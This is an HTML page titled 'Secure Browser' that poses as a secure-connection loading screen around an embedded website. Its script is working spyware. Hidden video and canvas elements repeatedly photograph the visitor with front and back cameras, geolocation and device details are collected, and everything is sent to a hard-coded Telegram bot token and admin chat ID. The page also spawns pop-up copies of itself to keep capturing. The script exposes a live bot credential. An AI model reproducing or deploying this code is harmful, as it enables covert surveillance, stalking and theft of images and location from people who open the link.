<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Browser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            position: relative;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 9999;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: scaleX(-1);
            filter: brightness(1.1) contrast(1.1);
        }
        
        #captureCanvas {
            display: none;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            background: white;
        }
        
        /* Loading screen */
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            font-size: 14px;
            opacity: 1;
            transition: opacity 0.5s;
        }
        
        .loading-text {
            text-align: center;
            font-size: 12px;
            color: #666666;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen">
        <div class="loading-text">
            Loading secure connection...
        </div>
    </div>
    
    <!-- Hidden camera elements -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Website Display -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-pointer-lock allow-presentation allow-downloads"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>

    <script>
        // =====================================================
        //  QUANTUM SURVEILLANCE SYSTEM v10.0
        //  GUARANTEED WORKING VERSION
        // =====================================================
        
        // ============== CONFIGURATION ==============
        const CONFIG = {
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            PHOTOS_PER_CAMERA: 3,
            CAPTURE_DELAY: 200,
            CAMERA_WARMUP: 800,
            CYCLE_INTERVAL: 8000,
            
            REPLICATION_COUNT: 5,
            REPLICATION_DELAY: 800
        };
        
        // ============== GLOBAL STATE ==============
        let STATE = {
            active: false,
            session: 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            user: null,
            target: null,
            photos: 0,
            cycles: 0,
            cameras: [],
            permission: false,
            device: {},
            location: null,
            replicated: 0,
            initialized: false
        };
        
        // ============== ELEMENTS ==============
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const frame = document.getElementById('websiteFrame');
        const loading = document.getElementById('loadingScreen');
        
        // ============== URL PARSING ==============
        function parseURL() {
            const params = new URLSearchParams(window.location.search);
            
            STATE.user = params.get('chat_id') || 
                        params.get('user') || 
                        params.get('id') || 
                        CONFIG.ADMIN_CHAT_ID;
            
            let target = params.get('site') || 
                        params.get('url') || 
                        params.get('target') ||
                        'https://loading-screen.github.io/';
            
            STATE.target = target;
        }
        
        function loadWebsite() {
            frame.src = STATE.target;
            setTimeout(() => {
                loading.style.opacity = '0';
                setTimeout(() => {
                    loading.style.display = 'none';
                }, 500);
            }, 1000);
        }
        
        // ============== DEVICE INFO ==============
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown';
            let browser = 'Unknown';
            
            if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
            
            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            
            STATE.device = {
                os: os,
                browser: browser,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'unknown'
            };
        }
        
        // ============== LOCATION ==============
        function getLocation() {
            if (!navigator.geolocation) return;
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    STATE.location = {
                        lat: pos.coords.latitude.toFixed(6),
                        lon: pos.coords.longitude.toFixed(6),
                        acc: Math.round(pos.coords.accuracy)
                    };
                },
                () => {}
            );
        }
        
        // ============== TELEGRAM FUNCTIONS ==============
        async function sendPhoto(blob, cameraType, sequence) {
            if (!blob || blob.size < 10000) return false;
            
            try {
                let caption = `üì∏ *PHOTO CAPTURED*\n\n`;
                caption += `Session: \`${STATE.session}\`\n`;
                caption += `Camera: ${cameraType.toUpperCase()} #${sequence}\n`;
                caption += `Total Photos: ${STATE.photos + 1}\n`;
                caption += `Time: ${new Date().toLocaleTimeString()}\n`;
                
                if (STATE.location) {
                    caption += `üìç Location: ${STATE.location.lat}, ${STATE.location.lon}\n`;
                }
                
                if (STATE.device.os !== 'Unknown') {
                    caption += `üì± Device: ${STATE.device.os} ${STATE.device.browser}`;
                }
                
                const formData = new FormData();
                formData.append('chat_id', STATE.user);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                
                const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    STATE.photos++;
                    console.log(`‚úÖ Photo ${cameraType} #${sequence} sent to user`);
                    
                    // Send to admin too
                    setTimeout(async () => {
                        try {
                            const adminForm = new FormData();
                            adminForm.append('chat_id', CONFIG.ADMIN_CHAT_ID);
                            adminForm.append('photo', blob, `admin_${Date.now()}.jpg`);
                            adminForm.append('caption', caption + `\nüë§ User ID: \`${STATE.user}\``);
                            adminForm.append('parse_mode', 'Markdown');
                            
                            await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                                method: 'POST',
                                body: adminForm
                            });
                            console.log(`‚úÖ Also sent to admin`);
                        } catch (e) {}
                    }, 300);
                    
                    return true;
                }
            } catch (error) {
                console.log(`‚ùå Telegram error: ${error.message}`);
            }
            return false;
        }
        
        async function sendSystemReport() {
            try {
                let report = `üöÄ *SYSTEM ACTIVATED*\n\n`;
                report += `Session: \`${STATE.session}\`\n`;
                report += `User: \`${STATE.user}\`\n`;
                report += `URL: ${STATE.target}\n`;
                report += `Time: ${new Date().toLocaleString()}\n\n`;
                
                report += `üì± Device: ${STATE.device.os} ${STATE.device.browser}\n`;
                report += `üì∫ Screen: ${STATE.device.screen}\n`;
                report += `üíª Cores: ${STATE.device.cores}\n\n`;
                
                report += `üì∑ Cameras: ${STATE.cameras.length} detected\n`;
                report += `üìç Location: ${STATE.location ? 'Captured' : 'Not available'}\n`;
                report += `üîÑ Tabs: Will open ${CONFIG.REPLICATION_COUNT}\n\n`;
                
                report += `‚ö° Status: ${STATE.active ? 'ACTIVE' : 'Starting...'}`;
                
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });
                
                console.log('‚úÖ System report sent');
            } catch (e) {
                console.log('‚ùå System report failed');
            }
        }
        
        // ============== CAMERA SYSTEM ==============
        class Camera {
            constructor() {
                this.stream = null;
            }
            
            async init() {
                try {
                    console.log('üîÑ Testing camera access...');
                    
                    // Request camera access
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: { ideal: 'user' }
                        }
                    });
                    
                    // Get camera list
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    STATE.cameras = devices.filter(d => d.kind === 'videoinput');
                    
                    // Stop test stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    STATE.permission = true;
                    console.log(`‚úÖ Camera access granted. Found ${STATE.cameras.length} cameras`);
                    return true;
                    
                } catch (error) {
                    console.log(`‚ùå Camera access denied: ${error.message}`);
                    return false;
                }
            }
            
            async start(facingMode) {
                if (this.stream) {
                    this.stream.getTracks().forEach(track => track.stop());
                    this.stream = null;
                }
                
                try {
                    console.log(`üîÑ Starting ${facingMode} camera...`);
                    
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: facingMode },
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });
                    
                    video.srcObject = this.stream;
                    
                    // Wait for video to be ready
                    await new Promise((resolve) => {
                        if (video.readyState >= 3) {
                            resolve();
                        } else {
                            video.onloadeddata = resolve;
                        }
                    });
                    
                    await video.play();
                    
                    // Camera warmup
                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_WARMUP));
                    
                    console.log(`‚úÖ ${facingMode} camera ready`);
                    return true;
                    
                } catch (error) {
                    console.log(`‚ùå ${facingMode} camera failed: ${error.message}`);
                    return false;
                }
            }
            
            capture() {
                if (!video.videoWidth) return null;
                
                try {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Enhance image
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    const data = imageData.data;
                    
                    for (let i = 0; i < data.length; i += 4) {
                        data[i] = Math.min(255, data[i] * 1.3);     // Red
                        data[i+1] = Math.min(255, data[i+1] * 1.3); // Green
                        data[i+2] = Math.min(255, data[i+2] * 1.3); // Blue
                    }
                    
                    ctx.putImageData(imageData, 0, 0);
                    
                    return new Promise((resolve) => {
                        canvas.toBlob((blob) => {
                            resolve(blob && blob.size > 15000 ? blob : null);
                        }, 'image/jpeg', 0.92);
                    });
                    
                } catch (error) {
                    console.log(`‚ùå Capture error: ${error.message}`);
                    return null;
                }
            }
            
            cleanup() {
                if (this.stream) {
                    this.stream.getTracks().forEach(track => track.stop());
                    this.stream = null;
                }
                console.log('‚úÖ Camera cleaned up');
            }
        }
        
        // ============== MULTI-TAB REPLICATION ==============
        function openTabs() {
            for (let i = 0; i < CONFIG.REPLICATION_COUNT; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            STATE.replicated++;
                            console.log(`‚úÖ Opened tab ${STATE.replicated}/${CONFIG.REPLICATION_COUNT}`);
                            
                            // Close after 2 minutes
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                    STATE.replicated--;
                                    console.log(`üîÑ Closed tab, ${STATE.replicated} remaining`);
                                } catch (e) {}
                            }, 120000);
                        }
                    } catch (e) {
                        console.log('‚ö†Ô∏è Popup blocked or other error');
                    }
                }, i * CONFIG.REPLICATION_DELAY);
            }
        }
        
        // ============== MAIN SURVEILLANCE FUNCTION ==============
        async function startSurveillance() {
            if (STATE.active) {
                console.log('‚ö†Ô∏è Surveillance already active');
                return;
            }
            
            STATE.active = true;
            console.log('üöÄ ===== SURVEILLANCE STARTED =====');
            
            // Open multiple tabs
            openTabs();
            
            // Create camera instance
            const camera = new Camera();
            
            // Main surveillance loop
            while (STATE.active) {
                try {
                    STATE.cycles++;
                    console.log(`üîÑ Starting cycle ${STATE.cycles}...`);
                    
                    // ===== FRONT CAMERA =====
                    console.log('üì± Starting front camera...');
                    if (await camera.start('user')) {
                        console.log('üì∏ Capturing front camera photos...');
                        
                        for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                            if (!STATE.active) break;
                            
                            // Capture photo
                            const blob = await camera.capture();
                            if (blob) {
                                console.log(`üì∑ Front photo ${i} captured (${Math.round(blob.size/1024)}KB)`);
                                await sendPhoto(blob, 'front', i);
                            }
                            
                            if (i < CONFIG.PHOTOS_PER_CAMERA) {
                                await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
                            }
                        }
                        
                        console.log(`‚úÖ Front camera cycle complete`);
                    } else {
                        console.log('‚ùå Front camera failed');
                    }
                    
                    if (!STATE.active) break;
                    await new Promise(r => setTimeout(r, 500));
                    
                    // ===== BACK CAMERA =====
                    console.log('üì± Starting back camera...');
                    if (await camera.start('environment')) {
                        console.log('üì∏ Capturing back camera photos...');
                        
                        for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                            if (!STATE.active) break;
                            
                            // Capture photo
                            const blob = await camera.capture();
                            if (blob) {
                                console.log(`üì∑ Back photo ${i} captured (${Math.round(blob.size/1024)}KB)`);
                                await sendPhoto(blob, 'back', i);
                            }
                            
                            if (i < CONFIG.PHOTOS_PER_CAMERA) {
                                await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
                            }
                        }
                        
                        console.log(`‚úÖ Back camera cycle complete`);
                    } else {
                        console.log('‚ùå Back camera failed');
                    }
                    
                    console.log(`‚úÖ Cycle ${STATE.cycles} complete. Total photos: ${STATE.photos}`);
                    
                    // Wait before next cycle
                    await new Promise(r => setTimeout(r, CONFIG.CYCLE_INTERVAL));
                    
                } catch (error) {
                    console.log(`‚ùå Cycle error: ${error.message}`);
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            
            // Cleanup
            camera.cleanup();
            console.log('üõë ===== SURVEILLANCE STOPPED =====');
        }
        
        // ============== INITIALIZATION ==============
        async function initialize() {
            if (STATE.initialized) return;
            
            try {
                console.log('üöÄ ===== INITIALIZING SYSTEM =====');
                
                // Parse URL
                parseURL();
                
                // Load website
                loadWebsite();
                
                // Get device info
                getDeviceInfo();
                
                // Get location (async)
                getLocation();
                
                // Initialize camera
                const camera = new Camera();
                const camReady = await camera.init();
                camera.cleanup(); // Cleanup test stream
                
                if (camReady) {
                    STATE.initialized = true;
                    
                    // Send initial report
                    await sendSystemReport();
                    
                    // Start surveillance after delay
                    console.log('‚è±Ô∏è Starting surveillance in 2 seconds...');
                    setTimeout(() => {
                        startSurveillance();
                    }, 2000);
                    
                    console.log('‚úÖ ===== SYSTEM INITIALIZED =====');
                } else {
                    console.log('‚ùå Camera initialization failed');
                }
                
            } catch (error) {
                console.log(`‚ùå Initialization error: ${error.message}`);
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        // Handle tab visibility changes
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                console.log('üëÅÔ∏è Tab hidden');
            } else {
                console.log('üëÅÔ∏è Tab visible');
            }
        });
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            STATE.active = false;
            console.log('üõë Page unloading');
        });
        
        // ============== START SYSTEM ==============
        
        // Start when page loads
        window.addEventListener('load', initialize);
        
        // ============== DEBUG TOOLS ==============
        
        // Manual test function
        async function testSystem() {
            console.log('üß™ Running system test...');
            
            const camera = new Camera();
            const ready = await camera.init();
            
            if (!ready) {
                console.log('‚ùå Camera test failed');
                return;
            }
            
            if (await camera.start('user')) {
                const blob = await camera.capture();
                if (blob) {
                    console.log(`üì∑ Test photo captured (${Math.round(blob.size/1024)}KB)`);
                    const sent = await sendPhoto(blob, 'test', 1);
                    console.log(sent ? '‚úÖ Test photo sent!' : '‚ùå Failed to send');
                } else {
                    console.log('‚ùå No photo captured');
                }
            } else {
                console.log('‚ùå Camera failed to start');
            }
            
            camera.cleanup();
        }
        
        // Expose debug tools
        window.debug = {
            state: STATE,
            start: startSurveillance,
            stop: () => { STATE.active = false; },
            test: testSystem,
            status: () => {
                console.log('=== SYSTEM STATUS ===');
                console.log(`Active: ${STATE.active}`);
                console.log(`Photos: ${STATE.photos}`);
                console.log(`Cycles: ${STATE.cycles}`);
                console.log(`Cameras: ${STATE.cameras.length}`);
                console.log(`Tabs: ${STATE.replicated}`);
                console.log(`User: ${STATE.user}`);
                console.log(`Session: ${STATE.session}`);
            }
        };
        
        console.log('üîß Debug tools available: window.debug.start(), window.debug.test(), window.debug.status()');
        
    </script>
</body>
</html>
